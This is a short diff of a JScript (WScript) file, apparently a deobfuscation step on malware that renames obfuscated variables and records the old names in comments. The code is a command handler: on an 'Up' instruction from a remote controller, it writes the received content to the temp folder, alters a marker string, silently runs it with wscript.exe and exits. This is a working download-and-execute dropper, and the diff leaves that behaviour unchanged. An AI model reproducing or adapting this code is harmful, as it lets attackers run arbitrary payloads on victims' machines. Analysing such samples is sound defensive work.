@@ -73,13 +73,13 @@ do {
 
 	
 	if (Response[0] === "Up") {
-	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
-	    var ctf = FileSystem.CreateTextFile(s2,true);
-	    var gu = Response[1];
+	    var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; // s2
+	    var file = FileSystem.CreateTextFile(pathTemp,true); // ctf
+	    var gu = Response[1]; // gu
 	    gu = gu.replace("|U|","|V|");
-	    ctf.Write(gu);
-	    ctf.Close();
-	    shell.run("wscript.exe //B \"" + s2 + "\"",6);
+	    file.Write(gu);
+	    file.Close();
+	    shell.run("wscript.exe //B \"" + pathTemp + "\"",6);
 	    WScript.Quit(1);
 	}
 
